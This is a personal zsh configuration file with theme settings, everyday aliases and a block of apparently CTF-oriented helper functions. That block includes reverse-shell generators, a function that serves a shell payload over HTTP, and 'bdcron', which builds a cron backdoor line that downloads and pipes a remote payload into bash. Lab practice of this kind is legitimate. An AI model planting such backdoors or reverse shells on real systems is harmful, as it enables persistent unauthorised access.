export ZSH="$HOME/.oh-my-zsh"
export PATH="$HOME/.local/bin:$PATH"

ZSH_THEME="agnoster"

plugins=(
  themes
  cp
  sudo
  vi-mode
  zsh-autosuggestions
  zsh-syntax-highlighting
)

ZSH_AUTOSUGGEST_STRATEGY=(history completion)
ZSH_AUTOSUGGEST_USE_ASYNC=1

source $ZSH/oh-my-zsh.sh

typeset -gA ZSH_HIGHLIGHT_STYLES

ZSH_HIGHLIGHT_STYLES[arg0]=fg=4
ZSH_HIGHLIGHT_STYLES[command]=fg=4
ZSH_HIGHLIGHT_STYLES[alias]=fg=4
ZSH_HIGHLIGHT_STYLES[suffix-alias]=fg=4
ZSH_HIGHLIGHT_STYLES[precommand]=fg=4,bold
ZSH_HIGHLIGHT_STYLES[builtin]=fg=6,bold
ZSH_HIGHLIGHT_STYLES[default]=fg=12
ZSH_HIGHLIGHT_STYLES[path]=fg=12
ZSH_HIGHLIGHT_STYLES[single-hyphen-option]=fg=5
ZSH_HIGHLIGHT_STYLES[double-hyphen-option]=fg=208,bold
ZSH_HIGHLIGHT_STYLES[assign]=fg=14

# Fix slow pasting with zsh-autosuggest
zstyle ':bracketed-paste-magic' active-widgets '.self-*'

# Autojump
# Arch
[[ -s /etc/profile.d/autojump.sh ]] && source /etc/profile.d/autojump.sh
# Debian
[[ -s /usr/share/autojump/autojump.sh ]] && source /usr/share/autojump/autojump.sh

# thefuck
command -v thefuck &>/dev/null && eval $(thefuck --alias)

# History size
SAVEHIST=50001

export EDITOR='vim'

# general Aliases
alias tmux="tmux -2"
alias pubip="curl ipinfo.io/ip"
alias cp="cpv -iv"
alias mv="mv -iv"
alias rm="rm -v"
alias ip="ip -c"
command -v exa >/dev/null && { alias l="exa -lahg --icons --octal-permissions" && alias ll="exa -lhg --icons --octal-permissions" }
command -v lf &>/dev/null || alias lf="ranger"

portforward() {
  socat TCP4-LISTEN:"$1",fork TCP4:"$2"
}

# Quickly generate a password
pwgen() {
  if [ -z ${1} ]; then
    _PWLENGTH=20
  else
    _PWLENGTH="$1"
  fi
  tr -dc _\!\"\%\&\/\(\)\=A-Z-a-z-0-9 < /dev/urandom | head -c "$_PWLENGTH"; echo
}

alias updaterc="wget https://raw.githubusercontent.com/Gobidev/dotfiles/main/.zshrc -O ~/.zshrc &>/dev/null && echo 'Update successful'"

# wireguard aliases
alias wg0="sudo systemctl stop wg-quick@wg1 && sudo systemctl start wg-quick@wg0"
alias wg1="sudo systemctl stop wg-quick@wg0 && sudo systemctl start wg-quick@wg1"

# git aliases
alias gsync="git pull && git add . && git commit -am 'Update' && git push"

# clipboard aliases
command -v xclip >/dev/null && { alias setclip="xclip -selection c" && alias getclip="xclip -selection c -o" }
command -v wl-copy >/dev/null && { alias setclip="wl-copy" && alias getclip="wl-paste" }

# latex aliases
code2pdf() {
  echo "LS0tCmhlYWRlci1pbmNsdWRlczoKIC0gXHVzZXBhY2thZ2V7ZnZleHRyYX0KIC0gXERlZmluZVZlcmJhdGltRW52aXJvbm1lbnR7SGlnaGxpZ2h0aW5nfXtWZXJiYXRpbX17YnJlYWtsaW5lcyxjb21tYW5kY2hhcnM9XFxce1x9fQotLS0=" | base64 -d \
    > "$(echo $1 | grep ".*\." --only-matching)md"
  echo "\n\`\`\`$(echo $1 | grep -E "\.\w+" --only-matching | sed "s/\.//g")\n$(cat $1)\n\`\`\`" \
    >> "$(echo $1 | grep ".*\." --only-matching)md"
  pandoc "$(echo $1 | grep ".*\." --only-matching)md" --pdf-engine=xelatex -s -V geometry:margin=2cm -o \
  "$(echo $1 | grep ".*\." --only-matching)pdf"
  rm "$(echo $1 | grep ".*\." --only-matching)md" >/dev/null
}

xconvert() {
  xournalpp -p "$(echo "$1" | sed -e "s/.xopp//g")_x.pdf" "$1"
}

xconvertall() {
  for file in *.xopp(.); do xconvert "$file"; done
}

# Compile and run c program
crun() {
  gcc -g -DDEBUG -Wall -Wextra -pedantic -std=c17 -o "$(basename $1 .c).out" "$1" && ./"$(basename $1 .c).out"
}

# ctf aliases
ctf_interface="tun0"

rs() {
  if [[ "$1" != "" ]]; then
    tip="$1"
  fi
  rustscan -b 2000 --ulimit 5000 -a "$tip" -- -A | tee rustscan.log
}

grip() {
  grep -o -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' $1
}

getip() {
  echo "$(ip a s $ctf_interface | grip)"
}

cpip() {
  getip | setclip
}

newctf() {
  target_name="$1"
  target_name_upper="$(tr '[:lower:]' '[:upper:]' <<< ${target_name:0:1})${target_name:1}"
  tip="$2"
  my_ip="$(getip)"

  mkdir "$target_name" && cd "$target_name"
  echo "# $target_name_upper\n\nMy IP:         $my_ip\nTarget IP:     $tip\n\n" > notes.md
  echo "$tip" > target_ip
  code .
}

sett() {
  tip="$1"
  echo "$tip" > target_ip
}

gett() {
  echo "$tip"
  echo "$tip" | setclip
}

genrev() {
  if [[ "$2" != "" ]]; then
    rev_port="$2"
  else
    rev_port="9999"
  fi
  echo "$(pms -i $(getip) -p $rev_port -s -t $1)"
}

genrevc() {
  revshell="$(genrev $@)"
  echo "$revshell" && echo "$revshell" | setclip
}

revpayload() {
  echo "#!/bin/sh\n$(genrev $@)" > payload
  python -m http.server
}

bdcron() {
  echo "* * * * * /usr/bin/wget -O- http://$(getip):8000/payload | /bin/bash" | setclip
}

alias gob="gobuster dir -w /usr/share/dirbuster/directory-list-2.3-medium.txt -o gobuster.log -u"
alias ferb="feroxbuster -o feroxbuster.log -u"
alias nik="nikto -o '$(pwd)'/nikto_log.txt -h"
alias up="python -m http.server"

gobt() { gob "$tip" }
ferbt() { ferb http://"$tip" }
nikt() { nik "$tip" }
pnt() { ping "$tip" }

if test -f target_ip; then
  tip="$(cat target_ip)"
fi

# pfetch
echo
pfetch
export PATH=$PATH:/home/h.loewe/.spicetify
